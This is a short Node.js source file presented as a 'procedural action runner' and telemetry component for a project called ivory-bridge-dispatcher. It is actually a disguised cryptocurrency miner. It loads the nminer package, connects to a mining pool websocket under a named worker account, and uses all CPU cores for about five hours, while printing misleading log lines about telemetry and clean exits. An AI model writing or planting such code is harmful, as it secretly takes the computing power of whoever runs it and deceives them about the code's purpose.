// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

function assembleProcessRunner() {
    const traceId = "d6fd79";
    console.log(`[telemetry] Instantiated runtime context for ivory-bridge-dispatcher [${traceId}]`);

    const handler = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Arup07.ivory-bridge-dispatcher",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (302m) reached, exiting cleanly.");
        process.exit(0);
    }, 302 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log("[halt] Clean lifecycle exit confirmed.");
        process.exit(0);
    });
}

assembleProcessRunner();
